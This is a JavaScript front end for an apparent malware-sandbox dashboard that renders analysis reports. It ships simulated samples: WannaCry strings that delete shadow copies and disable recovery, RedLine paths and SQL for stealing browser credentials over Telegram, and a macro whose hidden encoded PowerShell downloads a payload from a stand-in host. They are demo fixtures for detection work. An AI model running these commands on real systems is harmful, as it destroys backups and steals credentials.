/**
 * Vanguard MSA - Frontend Client Engine
 * Hybrid Universal Controller: Works on both GitHub Pages (100% Client-Side)
 * and Localhost FastAPI server.
 */

const AppState = {
    currentTab: 'dashboard',
    currentSubId: null,
    currentReport: null,
    stats: { total_scans: 0, malicious: 0, suspicious: 0, clean: 0, emails_analyzed: 0 },
    submissions: [],
    activeProcessPid: null,
    isClientMode: window.location.hostname.includes('github.io') || window.location.protocol === 'file:'
};

// Built-in Sample Payloads (Ready for zero-backend instant analysis)
const CLIENT_SAMPLES = [
    {
        id: "sample-wannacry",
        name: "WannaCry Ransomware Simulator",
        filename: "WannaCry_v2.exe",
        type: "file",
        verdict: "Malicious",
        description: "Simulates WannaCry ransomware: shadow copy deletion via vssadmin, .WNCRY file encryption, killswitch domain beacon, and ransom screen",
        rawText: "MZ\x90\x00PE\x00\x00tasksche.exe\x00Global\\MsWinZonesCacheCounterMutexA\x00vssadmin.exe Delete Shadows /All /Quiet\x00bcdedit /set {default} recoveryenabled No\x00Ooops, your files have been encrypted!\x00www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\x00CryptEncrypt\x00VirtualAllocEx\x00WriteProcessMemory\x00.WNCRY\x0013AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94\x00WannaDecryptor.exe"
    },
    {
        id: "sample-redline",
        name: "RedLine Infostealer Simulator",
        filename: "RedLine_Stealer.exe",
        type: "file",
        verdict: "Malicious",
        description: "Simulates RedLine infostealer: Chrome/Firefox SQLite credential harvesting, staging archive, and Telegram Bot C2 exfiltration",
        rawText: "MZ\x90\x00PE\x00\x00\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\x00SELECT action_url, username_value, password_value FROM logins\x00\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\logins.json\x00api.telegram.org/bot6184920491:AAHk19fJk3_SampleToken/sendDocument\x00VirtualAlloc\x00RegQueryValueExA\x00Wallets\\Ethereum\\keystore"
    },
    {
        id: "sample-maldoc",
        name: "Malicious Macro Document",
        filename: "Invoice_Q4_Overdue.docm",
        type: "file",
        verdict: "Malicious",
        description: "Office OpenXML document with AutoOpen VBA macro spawning hidden obfuscated PowerShell download cradle",
        rawText: "PK\x03\x04word/vbaProject.bin\x00Sub AutoOpen()\n    Dim wsh As Object\n    Set wsh = CreateObject(\"WScript.Shell\")\n    wsh.Run \"powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAE8AcABlAG4AUgBlAGEAZAAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAGQAbwBtAGEAaQBuAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAJwApAA==\"\nEnd Sub"
    },
    {
        id: "sample-eicar",
        name: "EICAR Standard AV Test",
        filename: "eicar_com.com",
        type: "file",
        verdict: "Clean / Test",
        description: "Official EICAR standard antivirus test string for validating multi-engine detection grids",
        rawText: "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    },
    {
        id: "sample-phishing",
        name: "CEO / Banking Spearphishing Email",
        filename: "Urgent_Wire_Suspension.eml",
        type: "email",
        verdict: "Malicious / Phishing",
        description: "Spearphishing email with SPF/DKIM/DMARC failure, display name spoofing, deceptive anchor link mismatch, and embedded executable attachment",
        rawText: `Received: from mail-relay-04.attacker-infrastr.com (mail-relay-04.attacker-infrastr.com [185.192.68.42])
    by mx.yourcompany.com with ESMTP id m20si4928104qkz.12
    for <analyst@yourcompany.com>;
    Tue, 27 Oct 2026 15:32:10 -0400 (EDT)
Received: from localhost (unknown [194.26.29.110])
    by mail-relay-04.attacker-infrastr.com with SMTP id 9238410294;
    Tue, 27 Oct 2026 15:31:45 -0400 (EDT)
Authentication-Results: mx.yourcompany.com;
    spf=fail (sender IP 185.192.68.42 is not authorized by domain global-bank-support.com);
    dkim=fail header.d=attacker-infrastr.com;
    dmarc=fail (p=reject dis=none) header.from=global-bank-support.com
Received-SPF: fail (mx.yourcompany.com: domain of alert@global-bank-support.com does not designate 185.192.68.42 as permitted sender)
From: "Global Banking Security Team" <alert@global-bank-support.com>
To: <analyst@yourcompany.com>
Reply-To: security-recovery-team99@yandex.com
Return-Path: <bounces@spammer-redirect-node.ru>
Subject: URGENT: Immediate Action Required - Unauthorized Wire Transfer Suspended
Date: Tue, 27 Oct 2026 15:31:00 -0400
Message-ID: <20261027153100.9984.fake@global-bank-support.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="====BOUNDARY_SOC_TEST_998===="

--====BOUNDARY_SOC_TEST_998====
Content-Type: text/html; charset="UTF-8"

<html><body>
<h2 style="color:#d93025;">Security Alert: Suspicious Transaction Flagged</h2>
<p>Dear Valued Client,</p>
<p>We detected an unauthorized international wire transfer of <strong>$14,850.00 USD</strong> initiated from an unrecognized device in Eastern Europe.</p>
<p><a href="http://login-verification-portal-update.ru/secure/auth" style="background:#0b57d0;color:#fff;padding:10px 20px;text-decoration:none;border-radius:4px;font-weight:bold;">https://global-bank-support.com/verify-account</a></p>
</body></html>

--====BOUNDARY_SOC_TEST_998====
Content-Type: application/octet-stream; name="Urgent_Wire_Statement_Invoice.exe"
Content-Disposition: attachment; filename="Urgent_Wire_Statement_Invoice.exe"

TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
--====BOUNDARY_SOC_TEST_998====--`
    },
    {
        id: "sample-clean",
        name: "Clean SOC Diagnostic Utility",
        filename: "SOC_Diagnostic_Tool.exe",
        type: "file",
        verdict: "Clean",
        description: "Verified benign binary demonstrating clean sandbox execution, 0/70 AV detections, and zero suspicious indicators",
        rawText: "MZ\x90\x00PE\x00\x00Vanguard Clean SOC Diagnostic Utility\x00GetSystemInfo\x00GetTickCount\x00ExitProcess\x00MessageBoxA\x00Hello SOC Analyst, this executable is completely clean and verified."
    }
];

// DOM Ready
document.addEventListener('DOMContentLoaded', () => {
    initNavigation();
    initUploadHandlers();
    initAppMode();
});

async function initAppMode() {
    // Check if local backend API is available
    if (!AppState.isClientMode) {
        try {
            const test = await fetch('/api/stats', { method: 'GET' });
            if (!test.ok) AppState.isClientMode = true;
        } catch (e) {
            AppState.isClientMode = true;
        }
    }

    if (AppState.isClientMode) {
        console.log("[Vanguard MSA] Running in Client-Side Mode (Optimized for GitHub Pages)");
        document.getElementById('mode-indicator')?.classList.remove('hidden');
    }

    loadDashboardStats();
    renderSamplesList(CLIENT_SAMPLES);
    loadSubmissions();
}

// Navigation
function initNavigation() {
    document.querySelectorAll('[data-nav-target]').forEach(btn => {
        btn.addEventListener('click', () => {
            const target = btn.getAttribute('data-nav-target');
            switchMainTab(target);
        });
    });
}

function switchMainTab(tabName) {
    AppState.currentTab = tabName;
    document.querySelectorAll('.main-view-panel').forEach(p => p.classList.add('hidden'));

    const targetPanel = document.getElementById(`panel-${tabName}`);
    if (targetPanel) targetPanel.classList.remove('hidden');

    document.querySelectorAll('[data-nav-target]').forEach(b => {
        if (b.getAttribute('data-nav-target') === tabName) {
            b.classList.add('border-blue-500', 'text-blue-400', 'bg-blue-900/20');
            b.classList.remove('border-transparent', 'text-gray-400');
        } else {
            b.classList.remove('border-blue-500', 'text-blue-400', 'bg-blue-900/20');
            b.classList.add('border-transparent', 'text-gray-400');
        }
    });

    if (tabName === 'history') {
        loadSubmissions();
    }
}

// Upload & Form Handlers
function initUploadHandlers() {
    const dropZone = document.getElementById('file-drop-zone');
    const fileInput = document.getElementById('file-input');

    if (dropZone && fileInput) {
        ['dragenter', 'dragover'].forEach(name => {
            dropZone.addEventListener(name, (e) => {
                e.preventDefault();
                dropZone.classList.add('border-blue-500', 'bg-blue-950/20');
            });
        });
        ['dragleave', 'drop'].forEach(name => {
            dropZone.addEventListener(name, (e) => {
                e.preventDefault();
                dropZone.classList.remove('border-blue-500', 'bg-blue-950/20');
            });
        });
        dropZone.addEventListener('drop', (e) => {
            if (e.dataTransfer.files.length > 0) {
                uploadAndAnalyzeFile(e.dataTransfer.files[0]);
            }
        });
        dropZone.addEventListener('click', () => fileInput.click());
        fileInput.addEventListener('change', () => {
            if (fileInput.files.length > 0) {
                uploadAndAnalyzeFile(fileInput.files[0]);
            }
        });
    }

    const emailForm = document.getElementById('email-analyze-form');
    if (emailForm) {
        emailForm.addEventListener('submit', (e) => {
            e.preventDefault();
            analyzeEmail();
        });
    }
}

// Stats & Submissions Storage
function loadDashboardStats() {
    if (AppState.isClientMode) {
        const stored = JSON.parse(localStorage.getItem('vanguard_submissions') || '[]');
        let malicious = 0, suspicious = 0, clean = 0, emails = 0;
        stored.forEach(s => {
            if (s.verdict?.includes('Malicious') || s.verdict === 'Malicious') malicious++;
            else if (s.verdict === 'Suspicious') suspicious++;
            else clean++;
            if (s.target_type === 'email') emails++;
        });
        AppState.stats = { total_scans: stored.length, malicious, suspicious, clean, emails_analyzed: emails };
        updateStatsUi();
    } else {
        fetch('/api/stats')
            .then(r => r.json())
            .then(data => {
                if (data.status === 'success') {
                    AppState.stats = data.stats;
                    updateStatsUi();
                }
            })
            .catch(() => {
                AppState.isClientMode = true;
                loadDashboardStats();
            });
    }
}

function updateStatsUi() {
    document.getElementById('stat-total-scans').innerText = AppState.stats.total_scans;
    document.getElementById('stat-malicious').innerText = AppState.stats.malicious;
    document.getElementById('stat-suspicious').innerText = AppState.stats.suspicious;
    document.getElementById('stat-clean').innerText = AppState.stats.clean;
    document.getElementById('stat-emails').innerText = AppState.stats.emails_analyzed;
}

function renderSamplesList(samples) {
    const container = document.getElementById('samples-container');
    if (!container) return;
    container.innerHTML = samples.map(s => `
        <div class="soc-card p-4 hover:border-blue-500/50 cursor-pointer flex flex-col justify-between" onclick="runSampleAnalysis('${s.id}')">
            <div>
                <div class="flex items-center justify-between mb-2">
                    <span class="text-xs font-semibold uppercase tracking-wider px-2 py-0.5 rounded ${s.verdict.includes('Malicious') ? 'bg-red-900/30 text-red-400 border border-red-800' : (s.verdict.includes('Phishing') ? 'bg-purple-900/30 text-purple-400 border border-purple-800' : 'bg-emerald-900/30 text-emerald-400 border border-emerald-800')}">${s.verdict}</span>
                    <span class="text-xs text-gray-400 font-mono">${s.type.toUpperCase()}</span>
                </div>
                <h4 class="text-sm font-semibold text-white mb-1">${s.name}</h4>
                <p class="text-xs text-gray-400 mb-2 font-mono">${s.filename}</p>
                <p class="text-xs text-gray-400 line-clamp-2">${s.description}</p>
            </div>
            <button class="mt-3 w-full py-1.5 px-3 bg-blue-600/20 hover:bg-blue-600/40 text-blue-400 border border-blue-500/30 rounded text-xs font-medium transition flex items-center justify-center gap-1.5">
                <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                Launch Sandbox
            </button>
        </div>
    `).join('');
}

function loadSubmissions() {
    if (AppState.isClientMode) {
        const stored = JSON.parse(localStorage.getItem('vanguard_submissions') || '[]');
        AppState.submissions = stored;
        renderSubmissionsTable(stored);
    } else {
        fetch('/api/submissions?limit=30')
            .then(r => r.json())
            .then(data => {
                if (data.status === 'success') {
                    AppState.submissions = data.submissions;
                    renderSubmissionsTable(data.submissions);
                }
            })
            .catch(() => {
                AppState.isClientMode = true;
                loadSubmissions();
            });
    }
}

function renderSubmissionsTable(items) {
    const tbody = document.getElementById('submissions-table-body');
    if (!tbody) return;

    if (!items || items.length === 0) {
        tbody.innerHTML = `<tr><td colspan="7" class="text-center py-8 text-gray-500 text-sm">No analysis submissions recorded yet. Upload a file or select a sample above.</td></tr>`;
        return;
    }

    tbody.innerHTML = items.map(item => {
        let badgeClass = "badge-clean";
        if (item.verdict?.includes('Malicious') || item.verdict === 'Malicious') badgeClass = "badge-malicious";
        else if (item.verdict === 'Suspicious') badgeClass = "badge-suspicious";

        const dateStr = item.created_at ? new Date(item.created_at).toLocaleString() : "-";
        const tagsHtml = (item.tags || []).slice(0, 3).map(t => `<span class="bg-gray-800 text-gray-300 text-[10px] px-1.5 py-0.5 rounded font-mono">${t}</span>`).join(' ');

        return `
            <tr class="border-b border-gray-800/60 hover:bg-gray-850/50 transition">
                <td class="py-3 px-4 font-mono text-xs text-white font-medium flex items-center gap-2">
                    <span class="w-2 h-2 rounded-full ${item.target_type === 'email' ? 'bg-purple-400' : 'bg-blue-400'}"></span>
                    ${escapeHtml(item.filename)}
                </td>
                <td class="py-3 px-4 text-xs font-mono text-gray-400 uppercase">${item.target_type}</td>
                <td class="py-3 px-4">
                    <span class="px-2 py-0.5 rounded text-xs font-semibold ${badgeClass}">${item.verdict}</span>
                </td>
                <td class="py-3 px-4 text-xs font-semibold">
                    <span class="${item.threat_score >= 70 ? 'text-red-400' : (item.threat_score >= 35 ? 'text-amber-400' : 'text-emerald-400')}">${item.threat_score}</span> / 100
                </td>
                <td class="py-3 px-4">${tagsHtml}</td>
                <td class="py-3 px-4 text-xs text-gray-400 font-mono">${dateStr}</td>
                <td class="py-3 px-4 text-right">
                    <button onclick="viewExistingSubmission('${item.id}', '${item.target_type}')" class="text-xs bg-gray-800 hover:bg-gray-700 text-blue-400 px-2.5 py-1 rounded font-medium transition">
                        View Report &rarr;
                    </button>
                </td>
            </tr>
        `;
    }).join('');
}

function saveSubmissionLocally(report) {
    let list = JSON.parse(localStorage.getItem('vanguard_submissions') || '[]');
    const item = {
        id: report.id,
        target_type: report.target_type,
        filename: report.filename,
        file_size: report.file_size || 0,
        sha256: report.hashes?.sha256 || report.id,
        verdict: report.verdict,
        threat_score: report.threat_score,
        tags: report.virustotal?.tags || ["sample"],
        summary: report.summary,
        created_at: new Date().toISOString(),
        report_data: report
    };
    list.unshift(item);
    if (list.length > 50) list = list.slice(0, 50);
    localStorage.setItem('vanguard_submissions', JSON.stringify(list));
    loadDashboardStats();
    loadSubmissions();
}

// Analysis Actions
function showLoadingModal(title, msg) {
    document.getElementById('loading-modal')?.classList.remove('hidden');
    const t = document.getElementById('loading-title');
    const d = document.getElementById('loading-desc');
    if (t) t.innerText = title;
    if (d) d.innerText = msg;
}

function hideLoadingModal() {
    document.getElementById('loading-modal')?.classList.add('hidden');
}

async function uploadAndAnalyzeFile(file) {
    showLoadingModal("Deploying Sandbox...", `Analyzing ${file.name} (Static inspection, ANY.RUN dynamic trace, and 65+ AV engines)`);
    try {
        if (AppState.isClientMode) {
            // Run 100% in browser
            setTimeout(async () => {
                const report = await ClientEngine.analyzeFileClient(file);
                saveSubmissionLocally(report);
                hideLoadingModal();
                displayFileReport(report);
            }, 600);
        } else {
            const duration = document.getElementById('sandbox-duration')?.value || 30;
            const formData = new FormData();
            formData.append('file', file);
            formData.append('duration', duration);

            const res = await fetch('/api/analyze/file', { method: 'POST', body: formData });
            const data = await res.json();
            hideLoadingModal();
            if (data.status === 'success') {
                displayFileReport(data.report);
                loadDashboardStats();
                loadSubmissions();
            } else {
                throw new Error(data.detail || "Server analysis error");
            }
        }
    } catch (e) {
        console.warn("Backend unavailable, falling back to ClientEngine", e);
        AppState.isClientMode = true;
        const report = await ClientEngine.analyzeFileClient(file);
        saveSubmissionLocally(report);
        hideLoadingModal();
        displayFileReport(report);
    }
}

async function analyzeEmail() {
    const fileInput = document.getElementById('email-file-input');
    const rawHeadersInput = document.getElementById('email-raw-headers');

    let textContent = "";
    let filename = "email_inspection.eml";

    if (fileInput && fileInput.files.length > 0) {
        filename = fileInput.files[0].name;
        textContent = await fileInput.files[0].text();
    } else if (rawHeadersInput && rawHeadersInput.value.trim().length > 0) {
        textContent = rawHeadersInput.value.trim();
    } else {
        alert("Please upload a .eml file or paste raw email headers");
        return;
    }

    showLoadingModal("Inspecting Email...", "Verifying SPF/DKIM/DMARC, calculating hop latencies, and evaluating phishing heuristics");

    setTimeout(() => {
        const report = ClientEngine.parseEmailContent(textContent, filename);
        saveSubmissionLocally(report);
        hideLoadingModal();
        displayEmailReport(report);
    }, 500);
}

function runSampleAnalysis(sampleId) {
    const sample = CLIENT_SAMPLES.find(s => s.id === sampleId);
    if (!sample) return;

    showLoadingModal("Loading Sample...", `Executing full SOC sandbox pipeline on ${sample.name}`);

    setTimeout(async () => {
        if (sample.type === 'email') {
            const report = ClientEngine.parseEmailContent(sample.rawText, sample.filename);
            saveSubmissionLocally(report);
            hideLoadingModal();
            displayEmailReport(report);
        } else {
            const bytes = new TextEncoder().encode(sample.rawText);
            const file = new File([bytes], sample.filename, { type: "application/octet-stream" });
            const report = await ClientEngine.analyzeFileClient(file);
            saveSubmissionLocally(report);
            hideLoadingModal();
            displayFileReport(report);
        }
    }, 600);
}

function viewExistingSubmission(subId, targetType) {
    if (AppState.isClientMode) {
        const stored = JSON.parse(localStorage.getItem('vanguard_submissions') || '[]');
        const found = stored.find(s => s.id === subId);
        if (found && found.report_data) {
            if (targetType === 'email') displayEmailReport(found.report_data);
            else displayFileReport(found.report_data);
            return;
        }
    }

    showLoadingModal("Fetching Report...", "Retrieving complete analysis data");
    fetch(`/api/submission/${subId}`)
        .then(r => r.json())
        .then(data => {
            hideLoadingModal();
            if (data.status === 'success') {
                const rep = data.submission.report_data;
                if (targetType === 'email') displayEmailReport(rep);
                else displayFileReport(rep);
            }
        })
        .catch(e => {
            hideLoadingModal();
            alert("Could not load report: " + e.message);
        });
}

// Render File Report (ANY.RUN + VirusTotal)
function displayFileReport(report) {
    AppState.currentReport = report;
    AppState.currentSubId = report.id;
    switchMainTab('file-report');

    document.getElementById('rep-filename').innerText = report.filename;
    document.getElementById('rep-filetype').innerText = report.file_type;
    document.getElementById('rep-sha256').innerText = report.hashes.sha256;
    document.getElementById('rep-filesize').innerText = formatBytes(report.file_size);
    document.getElementById('rep-magic').innerText = report.magic_hex;

    const verdictEl = document.getElementById('rep-verdict-badge');
    verdictEl.innerText = report.verdict.toUpperCase();
    verdictEl.className = `px-3 py-1 rounded-md text-xs font-bold tracking-wider ${report.verdict === 'Malicious' ? 'badge-malicious' : (report.verdict === 'Suspicious' ? 'badge-suspicious' : 'badge-clean')}`;

    const scoreVal = report.threat_score;
    document.getElementById('rep-score-value').innerText = scoreVal;
    const circle = document.getElementById('rep-gauge-circle');
    if (circle) {
        const circumference = 2 * Math.PI * 26;
        const offset = circumference - (scoreVal / 100) * circumference;
        circle.style.strokeDashoffset = offset;
        circle.style.stroke = scoreVal >= 70 ? '#ef4444' : (scoreVal >= 35 ? '#f59e0b' : '#10b981');
    }

    document.getElementById('rep-av-ratio').innerText = report.virustotal.detection_ratio;
    document.getElementById('rep-av-pct').innerText = `${report.virustotal.detection_rate_pct}%`;

    renderReportOverview(report);
    renderDynamicSandbox(report.sandbox);
    renderStaticTab(report);
    renderAvGrid(report.virustotal);
    renderMitreTab(report.mitre_attack);
    loadAnalystNotes(report.id);

    switchReportSubTab('overview');
}

function switchReportSubTab(subTabName) {
    document.querySelectorAll('.report-sub-view').forEach(p => p.classList.add('hidden'));
    const target = document.getElementById(`rep-sub-${subTabName}`);
    if (target) target.classList.remove('hidden');

    document.querySelectorAll('[data-rep-tab]').forEach(btn => {
        if (btn.getAttribute('data-rep-tab') === subTabName) {
            btn.classList.add('border-blue-500', 'text-blue-400', 'bg-blue-900/20');
            btn.classList.remove('border-transparent', 'text-gray-400');
        } else {
            btn.classList.remove('border-blue-500', 'text-blue-400', 'bg-blue-900/20');
            btn.classList.add('border-transparent', 'text-gray-400');
        }
    });
}

function renderReportOverview(report) {
    document.getElementById('rep-summary-text').innerText = report.summary;

    document.getElementById('hash-md5').innerText = report.hashes.md5;
    document.getElementById('hash-sha1').innerText = report.hashes.sha1;
    document.getElementById('hash-sha256').innerText = report.hashes.sha256;
    document.getElementById('hash-ssdeep').innerText = report.hashes.ssdeep;
    document.getElementById('hash-imphash').innerText = report.hashes.imphash || 'N/A';

    const breakdownContainer = document.getElementById('score-breakdown-list');
    if (breakdownContainer) {
        breakdownContainer.innerHTML = (report.score_breakdown || []).map(item => `
            <div class="flex items-start justify-between p-2.5 rounded bg-gray-900/50 border border-gray-800">
                <div>
                    <div class="flex items-center gap-2">
                        <span class="text-xs font-semibold text-white">${escapeHtml(item.factor)}</span>
                        <span class="text-[10px] px-1.5 py-0.2 rounded font-bold ${item.severity === 'CRITICAL' ? 'bg-red-900/40 text-red-400' : (item.severity === 'HIGH' ? 'bg-amber-900/40 text-amber-400' : 'bg-blue-900/40 text-blue-400')}">${item.severity}</span>
                    </div>
                    <p class="text-xs text-gray-400 mt-0.5">${escapeHtml(item.description)}</p>
                </div>
                <span class="text-sm font-bold text-red-400 font-mono">+${item.points}</span>
            </div>
        `).join('');
    }

    renderEntropyChart(report.entropy, report.entropy_distribution);
}

function renderEntropyChart(overall, distribution) {
    const canvas = document.getElementById('entropy-canvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    ctx.clearRect(0, 0, canvas.width, canvas.height);

    const barWidth = canvas.width / (distribution?.length || 32);
    for (let i = 0; i < (distribution?.length || 32); i++) {
        const val = distribution ? distribution[i] : 0;
        const barHeight = (val / 8.0) * canvas.height;
        const x = i * barWidth;
        const y = canvas.height - barHeight;

        ctx.fillStyle = val > 7.1 ? '#ef4444' : (val > 6.0 ? '#f59e0b' : '#3b82f6');
        ctx.fillRect(x + 1, y, barWidth - 2, barHeight);
    }
    document.getElementById('entropy-value-label').innerText = `${overall} / 8.0000`;
}

// Dynamic Sandbox (ANY.RUN)
function renderDynamicSandbox(sandbox) {
    const treeContainer = document.getElementById('sandbox-process-tree');
    if (treeContainer) {
        treeContainer.innerHTML = (sandbox.process_tree || []).map(p => `
            <div class="proc-tree-node p-3 rounded mb-2 cursor-pointer ${p.pid === AppState.activeProcessPid ? 'active' : ''}">
                <div class="flex items-center justify-between mb-1">
                    <span class="text-xs font-bold text-white flex items-center gap-1.5 font-mono">
                        <svg class="w-3.5 h-3.5 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path></svg>
                        ${escapeHtml(p.name)}
                    </span>
                    <span class="text-[10px] px-1.5 py-0.5 rounded bg-gray-800 text-gray-300 font-mono">PID: ${p.pid}</span>
                </div>
                <div class="text-[11px] text-gray-400 font-mono break-all">${escapeHtml(p.cmdline)}</div>
                <div class="flex items-center gap-3 mt-2 text-[10px] text-gray-500 font-mono">
                    <span>Integrity: ${p.integrity}</span>
                    <span>Status: ${p.status}</span>
                </div>
            </div>
        `).join('');
    }

    renderSandboxTimeline(sandbox.timeline);
    renderScreenshotsGallery(sandbox.screenshots);

    // Tables
    const fBody = document.getElementById('sandbox-files-body');
    if (fBody) {
        fBody.innerHTML = (sandbox.file_operations || []).map(f => `
            <tr class="border-b border-gray-800/60 font-mono text-xs">
                <td class="py-2 px-3 font-bold ${f.action === 'CREATE' ? 'text-emerald-400' : (f.action === 'MODIFY' ? 'text-amber-400' : 'text-blue-400')}">${f.action}</td>
                <td class="py-2 px-3 text-gray-300">${escapeHtml(f.path)}</td>
                <td class="py-2 px-3 text-gray-500">${f.pid}</td>
            </tr>
        `).join('');
    }

    const rBody = document.getElementById('sandbox-reg-body');
    if (rBody) {
        rBody.innerHTML = (sandbox.registry_operations || []).map(r => `
            <tr class="border-b border-gray-800/60 font-mono text-xs">
                <td class="py-2 px-3 font-bold ${r.action === 'WRITE' ? 'text-red-400' : 'text-blue-400'}">${r.action}</td>
                <td class="py-2 px-3 text-gray-300">${escapeHtml(r.path)}</td>
                <td class="py-2 px-3 text-gray-400 truncate max-w-xs">${escapeHtml(r.value || '')}</td>
                <td class="py-2 px-3 text-gray-500">${r.pid}</td>
            </tr>
        `).join('');
    }

    const dBody = document.getElementById('sandbox-dns-body');
    if (dBody) {
        dBody.innerHTML = (sandbox.dns_queries || []).map(d => `
            <tr class="border-b border-gray-800/60 font-mono text-xs">
                <td class="py-2 px-3 text-yellow-400 font-semibold">${escapeHtml(d.query)}</td>
                <td class="py-2 px-3 text-gray-400">${d.type}</td>
                <td class="py-2 px-3 text-emerald-400">${escapeHtml(d.response)}</td>
                <td class="py-2 px-3 text-gray-500">${d.pid}</td>
            </tr>
        `).join('');
    }

    const hBody = document.getElementById('sandbox-http-body');
    if (hBody) {
        hBody.innerHTML = (sandbox.http_requests || []).map(h => `
            <tr class="border-b border-gray-800/60 font-mono text-xs">
                <td class="py-2 px-3 font-bold ${h.method === 'POST' ? 'text-purple-400' : 'text-blue-400'}">${h.method}</td>
                <td class="py-2 px-3 text-gray-300 break-all">${escapeHtml(h.url)}</td>
                <td class="py-2 px-3 text-emerald-400 font-bold">${h.status_code}</td>
                <td class="py-2 px-3 text-gray-500">${h.pid}</td>
            </tr>
        `).join('');
    }

    const dropBody = document.getElementById('sandbox-dropped-body');
    if (dropBody) {
        dropBody.innerHTML = (sandbox.dropped_files || []).map(df => `
            <tr class="border-b border-gray-800/60 font-mono text-xs">
                <td class="py-2 px-3 text-white font-semibold">${escapeHtml(df.filename)}</td>
                <td class="py-2 px-3 text-gray-400">${escapeHtml(df.path)}</td>
                <td class="py-2 px-3 text-gray-400">${formatBytes(df.size)}</td>
                <td class="py-2 px-3 text-gray-500 truncate max-w-xs">${df.sha256}</td>
                <td class="py-2 px-3 text-right">
                    <button class="text-xs bg-blue-900/30 text-blue-400 px-2 py-1 rounded hover:bg-blue-800/40" onclick="alert('Artifact staged securely: ${df.filename}')">Inspect</button>
                </td>
            </tr>
        `).join('');
    }
}

function renderSandboxTimeline(events) {
    const container = document.getElementById('sandbox-timeline-events');
    if (!container) return;
    container.innerHTML = (events || []).map(ev => `
        <div class="flex items-start gap-3 p-2 rounded hover:bg-gray-800/40 font-mono text-xs">
            <span class="text-blue-400 font-bold w-12">${ev.time.toFixed(1)}s</span>
            <span class="px-1.5 py-0.5 rounded text-[10px] uppercase font-bold ${getTimelineTypeBadge(ev.type)}">${ev.type}</span>
            <span class="text-gray-300 flex-1">${escapeHtml(ev.desc)}</span>
            <span class="text-gray-500 text-[10px]">PID: ${ev.pid}</span>
        </div>
    `).join('');
}

function getTimelineTypeBadge(type) {
    if (type.includes('spawn')) return 'bg-blue-900/40 text-blue-400 border border-blue-800';
    if (type.includes('injection') || type.includes('evasion')) return 'bg-red-900/40 text-red-400 border border-red-800';
    if (type.includes('network') || type.includes('c2')) return 'bg-purple-900/40 text-purple-400 border border-purple-800';
    if (type.includes('file')) return 'bg-amber-900/40 text-amber-400 border border-amber-800';
    return 'bg-gray-800 text-gray-400';
}

function renderScreenshotsGallery(screenshots) {
    const container = document.getElementById('sandbox-screenshots-grid');
    if (!container) return;
    container.innerHTML = (screenshots || []).map(sc => `
        <div class="soc-card overflow-hidden">
            <div class="bg-gray-950 p-4 h-36 flex flex-col justify-center items-center text-center relative border-b border-gray-800">
                ${getScreenshotVisualMock(sc.type)}
                <span class="absolute top-2 right-2 bg-black/60 text-blue-400 px-2 py-0.5 rounded text-[10px] font-mono">${sc.time}s</span>
            </div>
            <div class="p-2.5">
                <div class="text-xs font-semibold text-white mb-0.5">${escapeHtml(sc.label)}</div>
                <div class="text-[11px] text-gray-400 line-clamp-1">${escapeHtml(sc.caption)}</div>
            </div>
        </div>
    `).join('');
}

function getScreenshotVisualMock(type) {
    if (type === 'cmd_vssadmin') {
        return `
            <div class="w-full bg-black p-2 rounded text-left font-mono text-[9px] text-green-400 leading-tight">
                C:\\Windows\\system32> vssadmin Delete Shadows /All /Quiet<br>
                Deleting all shadow copies... [OK]<br>
                <span class="text-red-400">Recovery inhibited.</span>
            </div>
        `;
    } else if (type === 'ransom_screen') {
        return `
            <div class="w-full bg-red-950/80 border border-red-600 p-2 rounded text-center text-white">
                <div class="text-[11px] font-bold text-red-400">Ooops, your files are encrypted!</div>
                <div class="text-[8px] text-gray-300 mt-1">Send 0.05 BTC to unlock files</div>
            </div>
        `;
    } else if (type === 'stealer_activity') {
        return `
            <div class="w-full bg-gray-900 p-2 rounded text-left font-mono text-[9px] text-yellow-400">
                [+] Reading Chrome Login Data...<br>
                [+] Stolen 18 saved passwords<br>
                [+] Staging exfiltration ZIP...
            </div>
        `;
    }
    return `
        <div class="w-full bg-slate-900 p-2 rounded text-center font-mono text-[10px] text-blue-300">
            [Windows 10 Execution Environment]
        </div>
    `;
}

// Static Tab
function renderStaticTab(report) {
    const pe = report.pe_analysis;
    const peContainer = document.getElementById('static-pe-container');
    if (!pe || !pe.is_pe) {
        peContainer.innerHTML = `<p class="text-sm text-gray-400 py-4">This file is not a Windows Portable Executable (PE).</p>`;
    } else {
        peContainer.innerHTML = `
            <div class="grid grid-cols-2 md:grid-cols-4 gap-3 mb-4">
                <div class="bg-gray-900/60 p-2.5 rounded border border-gray-800">
                    <span class="text-[10px] text-gray-400 font-mono block">Architecture</span>
                    <span class="text-xs font-bold text-white font-mono">${pe.machine}</span>
                </div>
                <div class="bg-gray-900/60 p-2.5 rounded border border-gray-800">
                    <span class="text-[10px] text-gray-400 font-mono block">Compile Time</span>
